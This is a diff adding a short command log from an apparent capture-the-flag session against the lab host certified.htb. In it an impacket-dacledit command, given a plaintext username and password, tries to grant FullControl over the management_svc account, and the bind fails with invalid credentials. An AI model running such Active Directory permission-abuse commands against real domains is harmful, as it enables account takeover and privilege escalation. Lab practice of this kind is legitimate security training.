@@ -1,0 +1,10 @@
+### [2026-04-05 20:41:44] impacket-dacledit -action write -principal judith.mader -target management_svc -rights FullControl certified.htb/judith.mader:judith09@10.129.231.186
+
+$ impacket-dacledit -action write -principal judith.mader -target management_svc -rights FullControl certified.htb/judith.mader:judith09@10.129.231.186
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] automatic bind not successful - invalidCredentials
+
+# Exit code: 0
+# Duration: 2026-04-05 20:41:45
